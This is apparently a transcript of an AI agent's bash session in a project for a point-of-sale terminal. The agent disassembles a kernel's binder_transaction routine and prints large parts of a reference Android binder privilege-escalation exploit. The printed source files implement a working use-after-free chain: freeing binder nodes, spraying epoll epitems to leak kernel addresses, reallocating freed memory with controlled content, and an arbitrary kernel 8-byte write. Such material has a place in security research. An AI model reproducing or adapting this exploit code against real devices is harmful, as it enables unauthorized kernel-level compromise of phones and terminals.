c0885780 bl	0xc02a4d2c  (kzalloc_trace)
c08857c0 bl	0xc02a4d2c  (kzalloc_trace)
c0885ad0 bl	0xc088a63c  (new_buf)
c0885b6c bl	0xc088b400  (copy_to)
c0885ed8 bl	0xc088b444  (copy_from)
c0885eec bl	0xc087e110  (get_object)
c08864a8 bl	0xc088b400  (copy_to)
c088653c bl	0xc087e240  (validate_ptr)
c08865b8 bl	0xc087e318  (validate_fixup)
c08867a8 bl	0xc088b444  (copy_from)
c08867fc bl	0xc088b400  (copy_to)
c088688c bl	0xc088b444  (copy_from)
c0886a7c bl	0xc0884a14  (fixup_parent)
c0886aac bl	0xc088b400  (copy_to)
c0886ca0 bl	0xc088913c  (proc_transaction)
c0886d14 bl	0xc088913c  (proc_transaction)
c0886ebc bl	0xc088ab9c  (free_buf)
c0886ed8 bl	0xc02a63c4  (kfree)
c0886f10 bl	0xc02a63c4  (kfree)
c0886fac bl	0xc0880aec  (dec_node)


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && awk '/^c088653c/,/^c08866f0/' tmp/m3/dis2_binder_transaction.txt | grep -E \"ldr|mov|str|cmp|bl\" | head -60"}

[tool • bash]
c088653c  bl	0xc087e240
c0886548  ldr	r3, [pc, #-1284]	@ 0xc088604c
c088654c  ldr	r3, [r3]
c0886558  ldr	r0, [pc, #-1328]	@ 0xc0886030
c088655c  ldr	r1, [r9, #32]
c0886560  ldr	r2, [r7, #24]
c0886564  bl	0xc018ede0
c0886568  ldr	r3, [pc, #-1308]	@ 0xc0886054
c088656c  movw	r8, #3444	@ 0xd74
c0886570  ldr	r2, [r3, #216]	@ 0xd8
c0886574  cmp	r2, #0
c0886578  movne	r2, #2
c088657c  strne	r2, [r3, #216]	@ 0xd8
c0886584  ldrd	r2, [fp, #-148]	@ 0xffffff6c
c0886588  ldr	r0, [fp, #-176]	@ 0xffffff50
c088658c  strd	r2, [sp]
c0886590  ldrd	r2, [fp, #-108]	@ 0xffffff94
c0886594  strd	r2, [sp, #8]
c0886598  ldr	r3, [fp, #-260]	@ 0xfffffefc
c088659c  str	r3, [sp, #16]
c08865a0  ldr	r3, [fp, #-292]	@ 0xfffffedc
c08865a4  str	r3, [sp, #20]
c08865a8  ldrd	r2, [fp, #-236]	@ 0xffffff14
c08865ac  strd	r2, [sp, #24]
c08865b0  ldrd	r2, [fp, #-244]	@ 0xffffff0c
c08865b4  ldr	r1, [r4, #40]	@ 0x28
c08865b8  bl	0xc087e318
c08865bc  cmp	r0, #0
c08865c4  ldr	r3, [pc, #-1408]	@ 0xc088604c
c08865c8  ldr	r3, [r3]
c08865d4  ldr	r0, [pc, #-1448]	@ 0xc0886034
c08865d8  ldr	r1, [r9, #32]
c08865dc  ldr	r2, [r7, #24]
c08865e0  bl	0xc018ede0
c08865e4  ldr	r3, [pc, #-1432]	@ 0xc0886054
c08865e8  movw	r8, #3457	@ 0xd81
c08865ec  ldr	r2, [r3, #216]	@ 0xd8
c08865f0  cmp	r2, #0
c08865f4  movne	r2, #2
c08865f8  strne	r2, [r3, #216]	@ 0xd8
c0886600  ldr	r3, [r4, #24]
c0886604  mov	r1, #0
c088660c  ldr	r6, [r7]
c0886610  str	r3, [fp, #-308]	@ 0xfffffecc
c0886614  ldrd	r2, [fp, #-124]	@ 0xffffff84
c0886618  cmp	r3, r1
c088661c  cmpeq	r2, r0
c0886620  strd	r2, [fp, #-236]	@ 0xffffff14
c0886624  bls	0xc088666c
c0886628  ldr	r1, [pc, #-1508]	@ 0xc088604c
c088662c  ldr	r1, [r1]
c0886638  ldr	r0, [pc, #-1544]	@ 0xc0886038
c088663c  strd	r2, [sp]
c0886640  ldr	r1, [r6, #32]
c0886644  ldr	r2, [r7, #24]
c0886648  bl	0xc018ede0
c088664c  ldr	r3, [pc, #-1536]	@ 0xc0886054
c0886654  ldr	r3, [r3, #216]	@ 0xd8
c0886658  cmp	r3, #0
c088665c  ldrne	r3, [pc, #-1552]	@ 0xc0886054


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && awk '/^c088666[0-9a-f]/,/^c0886740/' tmp/m3/dis2_binder_transaction.txt | head -50; echo \"=== validate loop structure c08866f0-c0886720 ===\"; sed -n '/^c08866f8/,/^c0886748/p' tmp/m3/dis2_binder_transaction.txt"}

[tool • bash]
c0886660  movne	r2, #2
c0886664  strne	r2, [r3, #216]	@ 0xd8
c0886668  b	0xc08868d8
c088666c  ldr	r3, [fp, #-232]	@ 0xffffff18
c0886670  ldr	r2, [fp, #-236]	@ 0xffffff14
c0886674  ldrd	r0, [r5, #16]
c0886678  lsl	r3, r3, #2
c088667c  orr	r3, r3, r2, lsr #30
c0886680  str	r3, [fp, #-248]	@ 0xffffff08
c0886684  lsl	r3, r2, #2
c0886688  str	r3, [fp, #-252]	@ 0xffffff04
c088668c  mov	r2, r0
c0886690  mov	r3, r1
c0886694  ldrd	r0, [fp, #-252]	@ 0xffffff04
c0886698  cmp	r1, r3
c088669c  cmpeq	r0, r2
c08866a0  bhi	0xc08866dc
c08866a4  ldrd	r0, [fp, #-108]	@ 0xffffff94
c08866a8  sub	ip, fp, #260	@ 0x104
c08866ac  strd	r0, [ip]
c08866b0  mov	r0, r2
c08866b4  mov	r1, r3
c08866b8  ldrd	r2, [fp, #-252]	@ 0xffffff04
c08866bc  subs	r0, r0, r2
c08866c0  sbc	r1, r1, r3
c08866c4  mov	r2, r0
c08866c8  mov	r3, r1
c08866cc  ldrd	r0, [ip]
c08866d0  cmp	r1, r3
c08866d4  cmpeq	r0, r2
c08866d8  bls	0xc08866fc
c08866dc  ldr	r1, [pc, #-1688]	@ 0xc088604c
c08866e0  ldr	r1, [r1]
c08866e4  tst	r1, #1
c08866e8  beq	0xc088664c
c08866ec  ldrd	r2, [fp, #-236]	@ 0xffffff14
c08866f0  ldr	r0, [pc, #-1724]	@ 0xc088603c
c08866f4  strd	r2, [sp]
c08866f8  b	0xc0886640
c08866fc  sub	r1, fp, #260	@ 0x104
c0886700  ldrd	r2, [r5, #8]
c0886704  ldrd	r0, [r1]
c0886708  adds	r0, r0, r2
c088670c  adc	r1, r1, r3
c0886710  mov	r3, r1
c0886714  ldr	r1, [r4, #40]	@ 0x28
c0886718  ldr	r1, [r1, #44]	@ 0x2c
c088671c  subs	r2, r0, r1
c0886720  sub	r1, fp, #292	@ 0x124
c0886724  sbc	r3, r3, #0
=== validate loop structure c08866f0-c0886720 ===
c08866f8  b	0xc0886640
c08866fc  sub	r1, fp, #260	@ 0x104
c0886700  ldrd	r2, [r5, #8]
c0886704  ldrd	r0, [r1]
c0886708  adds	r0, r0, r2
c088670c  adc	r1, r1, r3
c0886710  mov	r3, r1
c0886714  ldr	r1, [r4, #40]	@ 0x28
c0886718  ldr	r1, [r1, #44]	@ 0x2c
c088671c  subs	r2, r0, r1
c0886720  sub	r1, fp, #292	@ 0x124
c0886724  sbc	r3, r3, #0
c0886728  strd	r2, [r1]
c088672c  ldr	r3, [fp, #-292]	@ 0xfffffedc
c0886730  and	r3, r3, #3
c0886734  cmp	r3, #0
c0886738  bne	0xc0886764
c088673c  ldrd	r2, [r1]
c0886740  sub	r1, fp, #260	@ 0x104
c0886744  sub	r5, fp, #160	@ 0xa0
c0886748  strd	r2, [r1]


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && ls src include 2>/dev/null; wc -l src/*.c src/*.h include/*.h 2>/dev/null | tail -20"}

[tool • bash]
include:
binder.h
binder_lookup.h
endpoint.h
exploit.h
handle.h
helpers.h
log.h
node.h
pending_node.h
realloc.h
uapi_binder.h

src:
binder.c
binder_lookup.c
endpoint.c
exploit.c
helpers.c
log.c
node.c
pending_node.c
realloc.c
   482 src/binder_lookup.c
   343 src/endpoint.c
   796 src/exploit.c
    30 src/helpers.c
    38 src/log.c
   540 src/node.c
   400 src/pending_node.c
   253 src/realloc.c
   119 include/binder.h
    11 include/binder_lookup.h
    37 include/endpoint.h
     8 include/exploit.h
    10 include/handle.h
     6 include/helpers.h
    10 include/log.h
    48 include/node.h
    34 include/pending_node.h
    14 include/realloc.h
   514 include/uapi_binder.h
  4917 total


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n 1,250p src/node.c"}

[tool • bash]
#include <errno.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>

#include "binder.h"
#include "binder_lookup.h"
#include "log.h"
#include "exploit.h"
#include "endpoint.h"
#include "node.h"

/*
 * Create a vulnerable dangling node within the binder transaction.
 */
static struct exp_node *_node_new(struct exp_node *node, const char *name)
{
	struct binder_state *bs = NULL;
	pthread_t *uaf_node_th = NULL;
	//uint32_t num_pending = 0x40;
	uint32_t num_pending = 0x40;
   uint64_t vma_start = 0;
	uint64_t handle = 0;

   if (!node || !name)
      return NULL;

	bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!bs) {
		return NULL;
	}

	handle = grab_handle(bs, name);
	if (!handle)
		return NULL;

	/* Prepare the pending nodes array. */
	uaf_node_th = calloc(num_pending + 1, sizeof(pthread_t));
   if (!uaf_node_th) {
      log_err("[-] Unable to allocate new pending node thread array. Reason: '%s'\n", strerror(errno));
      goto err;
   }

	vma_start = setup_pending_nodes(bs, handle, uaf_node_th, num_pending, 0);
   if (!vma_start) {
      log_err("[-] Bug trigger failed.\n");
      goto err;
   }

   /* Initialize exp_node. */
   node->bs = bs;
   node->vma_start = vma_start;
   memset(node->name, 0, sizeof(node->name));
   strncpy(node->name, name, sizeof(node->name) - 1);
   node->handle = handle;
   node->th = uaf_node_th;
   node->idx = 0;
   node->num_pending = num_pending;
   node->max = num_pending;
   node->second = false;
   node->target_fd = -1;
   node->ep_fd = -1;

   return node;

err:
   if (uaf_node_th)
      free(uaf_node_th);

   return NULL;
}

/*
 * Create a new `exp_node`.
 */
struct exp_node *node_new(const char *name)
{
   struct exp_node *node = NULL;

   node = calloc(1, sizeof(*node));
   if (!node) {
      log_err("[-] Unable to allocate new node. Reason: '%s'\n", strerror(errno));
      return NULL;
   }

   /* Need to bootstrap the associated endpoint. */
   bootstrap_endpoint(name);

   if (!_node_new(node, name)) {
      free(node);
      return NULL;
   }

   return node;
}

/*
 * Free all pending node threads.
 */
void node_free_pending_nodes(struct exp_node *node)
{
   int i;

	/* Terminate all pending nodes. */
	for (i = 0; i < node->num_pending; i++) {
		pending_node_terminate(node->bs, node->handle, node->th[i]);
	}

}

/*
 * Free an exp_node, and the associated binder endpoint and pending
 * transactions as well. The only way to safely remove a dangling
 * `binder_node` from the `binder_proc` is to close the associated
 * file descriptor.
 */
static void _node_free(struct exp_node *node, bool reset)
{

	int i;
	int n = node->num_pending;

	/* Terminate all pending nodes. */
	for (i = 0; i < n; i++) {
		pending_node_terminate(node->bs, node->handle, node->th[i]);
	}

	/* Close binder. */
	binder_close(node->bs);
   
   /* Close the remaining epitem if exists. */
   if (node[0].ep_fd != -1)
      close(node[0].ep_fd);

	/* Reset the associated endpoint. */
   if (reset) {
      //endpoint_reset(node->name);
      terminate_endpoint(node->name);
      bootstrap_endpoint(node->name);
   } else {
      terminate_endpoint(node->name);
      /* Free the memory associated with the node. */
      free(node->th);
      free(node);
   }
}

/*
 * Free an `exp_node` and terminate the associated
 * endpoint.
 */
void node_free(struct exp_node *node)
{
   _node_free(node, false);
}

/*
 * Reset an `exp_node` by restarting the remote endpoint.
 */
bool node_reset(struct exp_node *node)
{
   uint8_t name[16];

   memset(name, 0, sizeof(name));
   strncpy(name, node->name, sizeof(name)-1);
   _node_free(node, true);

   /* Reinit node. */
   if (_node_new(node, name))
      return true;

   return false;
}

/*
 * Use the vulnerable to decrement the refcount of the underlying `binder_node` and have it eventually
 * be `kfree()`ed.
 */
void node_kfree(struct exp_node *node)
{
   if (!node)
      return;

   pending_node_free(node->bs, node->handle, node->vma_start, node->num_pending + 1, 1, node->second);
}



#define NEPITEMS  0x20

/*
 * This function is used to disclose a `file` structure from a given file descriptor.
 * It relies on the fact that we can leak data at offset 0x58 and 0x60 a `binder_node`, which
 * exactly overlap with linked list pointer of epitem structure pointing to the 'file' we
 * gave in parameter to `EPOLLCTL_ADD`
 */
static bool _disclose_file_addr(struct exp_node *node, int *ep_arr, int n)
{
   uint64_t file_addr = 0;
   uint64_t origA, origB, A, B;
   int idx = -1;
   int i;

   if (!node || !ep_arr)
      return 0;

   /* leak the original value. */
   node_leak(node, &origA, &origB);

   if (origA == 0 || origB == 0 || origB == 0xdead000000000200)
      return 0;

   /* Close the epitems by starting by the end of the array. */
   i = n - 1;
   bool found = false;
   while (i >= 0) {
      /* Close 1 epitem. */
      close(ep_arr[i]);
      ep_arr[i] = -1;

      /* Leak the result to see if something changed. */
      node_leak(node, &A, &B);
      if (!found && (A != origA || B != origB)) {
         if (B == 0xdead000000000200) {
            return false;
         }
         idx = i - 1;
         i--;
         found = true;
      }
      i--;
   }

   /* Leak our values, we should have something interesting. */
   node_leak(node, &A, &B);

   node->file_addr = A - 0xd8;
   node->ep_fd = ep_arr[idx];

   return true;
}

/*
 * Free a `binder_node` and reallocates an `epitem` structure
 * in its place.
 */


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n 250,540p src/node.c"}

[tool • bash]
 */
bool node_realloc_epitem(struct exp_node *node, int fd)
{
   bool res = false;
   struct epoll_event evt;
   uint64_t file_addr = 0;
   int ep_arr[NEPITEMS + 1];
   int i, j, k, n;

   if (!node)
      return false;

   /* Prepare epoll structure. */
   bzero(&evt, sizeof(evt));
   evt.events = EPOLLIN;

  for (i = 0; i < NEPITEMS; i++)
      ep_arr[i] = -1;

  evt.data.fd = fd;
  epoll_ctl(ep_arr[0], EPOLL_CTL_ADD, fd, &evt);

   /* Allocate the epitems. */
  for (i = 0; i < NEPITEMS; i++) {
     int ep = epoll_create1(0);
      if (ep < 0) {
         log_err("epoll_create1: '%s'\n", strerror(errno));
         goto cleanup;
      }

      ep_arr[i] = ep;
  }

   /* Free the `binder_node`. */
   node_kfree(node);

   /* Try to reallocate with `struct epitem`. */
   for (i = 1; i < NEPITEMS; i++) {
      evt.data.fd = fd;
      epoll_ctl(ep_arr[i], EPOLL_CTL_ADD, fd, &evt);
   }

   if (!_disclose_file_addr(node, ep_arr, NEPITEMS))
      goto cleanup;

   node->target_fd = fd;

   return true;

cleanup:
      for (i = 0; i < NEPITEMS; i++) {
         if (ep_arr[i] != -1)
            close(ep_arr[i]);
      }

   return res;
}


/*
 * Disclose the kernel address of a `binder_node` by relying on 2 `binder_node`
 * whose content has been replaced by `epitem` structure.
 * We close the sprayed `epitem` structure, until we are sure about which epitem has
 * replace the content of our `binder_node`. By controlling 2 epitem which points back to each
 * other, we can disclose the content of both `binder_node` by reading the `prev` and `next` field
 * of the `epitem` structure, which in this case point to each other.
 */
bool node_kaddr_disclose(struct exp_node *node1, struct exp_node *node2)
{

   uint64_t a0;
   uint64_t b0;
   uint64_t b1;
   uint64_t a1;

   if (!node1->file_addr || node1->target_fd == -1 || node2->target_fd != -1)
      return false;

   /* The node needs to be single. */
   node_leak(node1, &a0, &b0);
   if (a0 != b0)
      return false;

   while (!node_realloc_epitem(node2, node1->target_fd))
      node_reset(node2);

   /* Looks good, let's disclose the respective kaddrs. */
   node_leak(node1, &a0, &b0);
   node_leak(node2, &a1, &b1);

   if (a0 == b1) {
      node1->kaddr = a1 - 0x58;
      node2->kaddr = b0 - 0x58;
   } else if (b0 == a1) {
      node2->kaddr = a0 - 0x58;
      node1->kaddr = b1 - 0x58;
   } else {
      return false;
   }

   return true;
}


/*
 * Free an epitem structure, by closing the file descriptor.
 * The only trouble here is the fact that it's freed using
 * `call_rcu()` which introduced indetermism when trying to replace
 * the freed content.
 */
bool node_free_epitem(struct exp_node *node)
{
   if (!node || node->ep_fd == -1)
      return false;

   close(node->ep_fd);
   node->ep_fd = -1;
   /* Allow the CPU to enter quiescent state and free the `epitem`. */
   usleep(10000); 

   return true;
}


/*
 * This function is a little bit complicated (slow?), as it needs to replace a
 * `binder_node` with an epitem first, to disclose its kernel address, and then replace it
 * with controlled content using the `sendmsg()` threads to do so. The only trouble being
 * that the `epitem` structure is freed using `call_rcu()` which introduces indetermism. Therefore
 * it gets tricky to reliably reallocate the content of the `binder_node`.
 */
bool node_realloc_content(struct exp_node *node, void *data, size_t size)
{
   bool res = false;
   uint64_t origA, A, B;

   if (!node)
      return false;


   setup_realloc_buffer(data, size);

   origA = *(uint64_t *)(data + 0x58);


   /* Decide which course of action to take. */

   
   /* Do we have an overlay with an epitem? */
   if (node->ep_fd != -1) {
      // Easy, just free the epitem. 
      close(node->ep_fd);
      usleep(10000);
      node->ep_fd = -1;
   } else if (node->tid) {
      //DO we really want to do that?
      log_info("node->tid!!!!\n");
      reset_realloc_threads();
      return false;
   } else {
      /* It hasn't been freed, so just kfree it. */
      node_kfree(node);
   }

   /* Let the threads spray kmalloc() with controlled content. */
   realloc_barrier_wait();
   /* Wait a little bit.*/

   /* Leak new node value and hope for the best. */
   node_leak(node, &A, &B);

   /* Double check to see if the node content was realloc properly. */
   if (A == origA) {
      res = true;

      if (discard_realloc_thread(B))
         node->tid = B;
   }

   reset_realloc_threads();

   return res;
}


/*
 * Trigger a write8 and overwrite and arbitrary location with a controlled value.
 * As above, we need to go through the cycle of replacing a `binder_node` with an epitem
 * and then with controlled content from the `sendmsg()`  threads.
 */
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where)
{
   struct exp_node *dummy = NULL;
   int pfd[2];
   uint8_t data[0x80];

   if (!node)
      return false;

   if (node->idx == node->num_pending)
      return false;

   memset(data, 0, 0x80);

   *(uint64_t *)(data + 0x20) = what;
   *(uint64_t *)(data + 0x28) = where;
   *(uint64_t *)(data + 0x30) = 0; 
   *(uint64_t *)(data + 0x38) = 0; /* proc == NULL */
   *(uint64_t *)(data + 0x40) = 0; /* No refs. */
   *(uint32_t *)(data + 0x48) = 0; /* Internal strong refs. */
   *(uint32_t *)(data + 0x4c) = 0; /* local_weak_refs  == 0.  */
   *(uint32_t *)(data + 0x50) = 1; /* local strong refs. */
   *(uint32_t *)(data + 0x54) = 0; /* tmp_refs == 0. */
   *(uint64_t *)(data + 0x58) = 0x4444444444444444; /* Used by node_realloc_content to verify replacement */
   *(uint64_t *)(data + 0x68) = 0; /* has_strong_refs == 0 &&  has_weak_refs == 0 */

   /* Create dummy node. */
   dummy = node_new("dummy");
   pipe(pfd);

   /* Overlay an epitem. */
   while (!node_realloc_epitem(dummy, pfd[0]))
         node_reset(dummy);


   /* Do we know the node kaddr yet? */
   if (!node->kaddr) {
      /* Drop the current epitem. */
      node_free_epitem(node);


      /* Use the previous'dummy' node to disclose both
       * dummy and node kaddr.
       */
      node_kaddr_disclose(dummy, node);
   }

   /* update the kaddr values to bypass safe unlinking. */
   *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
   *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;

   log_info("[*] Reallocating content of '%s' with controlled data.", node->name);
   while (!node_realloc_content(node, data, 0x80)) {
      log_info(".");
      node_reset(node);
      while (!node_kaddr_disclose(dummy, node)) {
         node_reset(node);
      }

      /* Update values. */
      *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
      *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;
   }

   if (dummy) {
      node_free(dummy);
      close(pfd[0]);
      close(pfd[1]);
   }
   log_info("[DONE]\n");

   /* Perform the actual write8, all the code before was for setup... */
   log_info("[+] Overwriting 0x%llx with 0x%llx...", where, what);
   pending_node_write8(node->th[node->idx - 1]);
   log_info("[DONE]\n");

   return true;
}


/*
 * Trigger a write8 primitive and overwrite an arbitrary location with a NULL value.
 * Assumes the binder node associated with `node` has just been freed, and its kernel
 * address has been previously disclosed.
 */
bool node_write_null(struct exp_node *node, uint64_t where)
{
   return node_write8(node, 0, where);
}


bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B)
{
   if (!node || node->idx == node->num_pending)
      return false;

   pending_node_leak(node->th[node->idx++], A, B);

   return true;
}



[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n 1,180p src/pending_node.c"}

[tool • bash]
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <sys/syscall.h>

#include "log.h"
#include "binder.h"
#include "endpoint.h"
#include "pending_node.h"

static struct pending_node *pending_nodes = NULL;
static uint64_t last_node_th = 0;

static struct pending_node *pending_node_new(void)
{
	struct pending_node *node = NULL;

	node = malloc(sizeof(*node));
	if (!node) {
		log_err("malloc: %s\n", strerror(errno));
		return NULL;
	}

	memset(node, 0, sizeof(*node));

	if (pthread_barrier_init(&node->barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->ready, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->do_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->done_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}


	/* Insert in front. */
	node->next = pending_nodes;
	pending_nodes = node;

	return node;
}

static struct pending_node *pending_node_get(pthread_t node_th)
{
	struct pending_node *tmp = pending_nodes;

	while (tmp) {
		if (tmp->uaf_node_th == node_th)
			return tmp;
		tmp = tmp->next;
	}

	return NULL;
}

/*
 * This thread keep a reference to the freed binder_node, which allows leaking a qword at offset 0x58
 * and 0x60 of an object in the kmalloc-128 slab, as well a trigerring a controlled write8
 */
void *pending_node_thread(void *args)
{
	struct pending_node *node = (struct pending_node *)args;
	uint32_t remaining = 0, consumed = 0;
	uint32_t looper = BC_ENTER_LOOPER;
	struct binder_io msg, reply;
	struct binder_state *from = node->bs;
	uint64_t handle = node->uaf_node;
	uint8_t msg_data[0x1000], reply_data[0x1000];
	uint64_t res = -1;
	int signo;
	sigset_t set;
   uint64_t retval = 0;

	/* Enter looper. */
	binder_write(from, &looper, sizeof(looper));

	struct binder_transaction_data *t = (struct binder_transaction_data *)(msg_data + sizeof(uint32_t));
	make_transaction(msg_data, false, handle, reply_data, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(from, msg_data, sizeof(*t) + sizeof(uint32_t));

	/* Poll for the answer. */
	/* Wait for BR_TRANSACTION_COMPLETE. */
	struct pollfd pfd;
	pfd.fd = from->fd;
	pfd.events = POLLIN;
	/* Wait up to a sec. */
	if (!poll(&pfd, 1, 1000)) {
		fprintf(stderr, "[-] Something went wrong will inserting the pending node.\n");
		pthread_exit(&res);
	}

	pthread_barrier_wait(&node->ready);
	
	pthread_barrier_wait(&node->ready);

   /* We wait here, until ask by the exploit to leak values from the transaction. */
   pthread_barrier_wait(&node->do_barrier); //Do leak

	/* Reading back transaction. */
	consumed = remaining = 0;
   uint32_t cmd;
	do {
      cmd = binder_read_next(from, reply_data, &remaining, &consumed);
   } while (cmd != BR_TRANSACTION && cmd != BR_REPLY); 

   /* Getting a BR_REPLY, would mean that we successfully cleaned up the transaction. */
   if (cmd == BR_REPLY)  {
      goto end;
   }
   
   t = (struct binder_transaction_data *)(reply_data + consumed - sizeof(*t));
	/* data at offset 0x58. */
	node->uaf_buffer = t->data.ptr.buffer;

	node->leaked_data[0] = t->target.ptr; /* data at offset 0x58. */
	node->leaked_data[1] = t->cookie;	/* data at offset 0x60. */

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;

   node->state = NODE_LEAKED;

   pthread_barrier_wait(&node->done_barrier);
   pthread_barrier_wait(&node->ready);

   /* This for sync. */

   pthread_barrier_wait(&node->do_barrier);

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;


	/* If we decide to go ahead with the buffer freeing, wait on the barrier,
	 * otherwise just exit the thread.
	 */
   binder_free_buffer(from, node->uaf_buffer);
   node->state = NODE_FREE;
end:
   pthread_barrier_wait(&node->done_barrier);
   ioctl(node->bs->fd, BINDER_THREAD_EXIT, 0);
	pthread_exit(&retval);
}



static void pending_node_create_thread(void *args)
{
	struct binder_state *bs = (struct binder_state *)*(uint64_t *)args;
	uint64_t node = *(uint64_t *)(args + 8);

	/* Create a ONE_WAY transaction to ask the endpoint to create a pending_node
	 * back to us.
	 */
	struct binder_transaction_data *t;
	uint8_t rdata[128];
	uint8_t txn_data[128];



[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n 180,400p src/pending_node.c"}

[tool • bash]

	uint32_t remaining = 0, consumed = 0;
	struct binder_io msg, reply;

	/* Register this thread as a looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(bs, &looper, sizeof(looper));


	/* Send the ONE_WAY transaction. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, true, node, rdata, 0x8, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	// printf("[*] About to make node\n");
	// getchar();
	/* Make the binder call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the transaction from the endpoint. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_TRANSACTION);


	// printf("[*] Node should be made\n");
	// getchar();

	/* Get transaction. */
	t = (struct binder_transaction_data *)(rdata + consumed - sizeof(*t));

	if (t->code != ADD_PENDING_NODE) {
		fprintf(stderr, "[-] Invalid transaction code %x. Expected %x\n", t->code, ADD_PENDING_NODE);
		exit(1);
	}

	/* Free the buffer. */
	binder_free_buffer(bs, t->data.ptr.buffer);

	/* Okay, so instead of a reply, we send a new transaction here, in order to have the thing go into the pending node list. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, false, node, rdata, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	int res = 0;
	pthread_exit(&res);
}

/*
 * The endpoint calls into this function to setup a pending node.
 */
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node)
{
	pthread_t th;

	struct pending_node *node = NULL;

	/* Create new pending_node */
	node = pending_node_new();
	if (!node)
		return NULL;

	node->bs = from;
	node->uaf_node = pending_node;

	if (pthread_create(&th, NULL, pending_node_thread, (void *)node)) {
		perror("pthread");
		return (pthread_t)-1;
	}

	node->uaf_node_th = th;
	last_node_th = th;

	pthread_barrier_wait(&node->ready);
	
   return th;
}


/*
 * The endpoint calls into this function to
 * remove a specific pending node.
 */
void terminate_pending_node(pthread_t th)
{
	/* Just unlock the barrier, and pthread_join */
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;


   pthread_barrier_wait(&node->ready);
   node->state = NODE_FINISHED;
   node->uaf_buffer = 0;
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	pthread_join(node->uaf_node_th, NULL);

	/* Remove node. */
	
	struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}
	free(node);
}


/*
 * Perform a ADD_PENDING_NODE binder query, in order to ask the remote
 * endpoint to create a pending node transaction.
 */
pthread_t pending_node_create(struct binder_state *bs, uint64_t node)
{
	uint64_t args[] = {bs, node};
	pthread_t th;

	if (pthread_create(&th, NULL, pending_node_create_thread, (void *)args)) {
		perror("pthread create\n");
		exit(0);
	}

	pthread_join(th, NULL);

	return last_node_th;
}

void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
{
	/* So we have our pending node in another thread. Now release our reference to uaf_node
	 * and trigger the bug (3 times needs) to free the uaf_node, while the pending node thread keeps
	 * a reference to it (as target_node)
	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}

/*
 * Trigger a write8, by having the pending node thread
 * calling BC_FREE_BUFFER, which will enter the
 * `binder_dec_node()` function with (hopefully) controlled
 * `binder_node`, ultimately leading to a controlled
 * write8
 */
void pending_node_write8(pthread_t th)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;
	/* Buffer release. */

   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
   pthread_join(th, NULL);
	
   struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}

	free(node);
}

/*
 * Kindly ask the endpoint to terminate a specific pending node thread.
 */
void pending_node_terminate(struct binder_state *bs, uint64_t handle, pthread_t th)
{
	uint8_t txn_data[0x100];
	uint8_t reply_data[0x100];
	struct binder_io msg, reply;


	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, reply_data, sizeof(reply_data), 10);

	bio_put_uint32(&msg, (uint32_t)th);
